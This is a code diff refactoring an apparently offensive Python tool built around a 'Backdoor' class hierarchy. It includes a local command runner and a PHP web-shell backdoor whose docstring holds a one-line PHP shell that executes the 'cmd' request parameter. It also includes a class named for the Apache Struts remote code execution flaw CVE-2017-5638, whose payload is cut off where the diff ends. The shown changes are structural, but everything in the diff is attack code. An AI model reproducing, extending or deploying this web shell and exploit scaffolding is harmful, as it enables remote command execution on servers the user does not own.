@@ -13,13 +13,20 @@ from os import environ, _exit
 disable_warnings(InsecureRequestWarning)
 
 class Backdoor(metaclass=ABCMeta):
+    def __init__(self, url):
+        self._url = url
+
+    @property
+    def url(self):
+        return self._url
+
     @abstractmethod
     def system(self, command):
         pass
 
 class LocalBackdoor(Backdoor):
     def __init__(self, url):
-        pass
+        super().__init__(url)
 
     def system(self, command):
         import subprocess
@@ -31,7 +38,7 @@ class PhpBackdoor(Backdoor):
         <?php echo system($_GET['cmd']); ?>
     """
     def __init__(self, url):
-        self.url = url
+        super().__init__(url)
 
     def system(self, command):
         params = { 'cmd' : command }
@@ -41,9 +48,9 @@ class PhpBackdoor(Backdoor):
 
         return text
 
-class CVE_2017_5638:
+class CVE_2017_5638(Backdoor):
     def __init__(self, url):
-        self.url = url
+        super().__init__(url)
 
     def system(self, command):
         payload = ""
